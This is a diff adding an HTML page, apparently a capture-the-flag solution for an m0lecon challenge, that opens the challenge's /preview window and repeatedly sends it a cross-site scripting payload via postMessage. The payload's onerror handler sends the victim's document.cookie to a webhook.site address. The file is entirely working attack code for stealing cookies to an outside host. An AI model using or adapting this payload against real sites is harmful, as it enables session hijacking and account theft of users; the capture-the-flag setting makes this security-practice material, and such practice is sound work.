@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<body>
+<script>
+const CHALLENGE = "https://8c626b15-30df-4baf-910a-293ee3faf0a3.offsec.m0lecon.it";
+const WEBHOOK = "https://webhook.site/b7564c1e-bad9-4c0d-9055-2aa40be83d7b";
+
+
+setTimeout(() => {
+  const w = window.open(CHALLENGE + "/preview", "x");
+
+  
+
+  const payload = `<img src=x onerror="location.href='${WEBHOOK}?cookie='+encodeURIComponent(document.cookie)">`;
+
+  setInterval(() => {
+      w.postMessage({ html: payload }, "*");
+  }, 500);
+}, 500);
+</script>
+</body>
+</html>
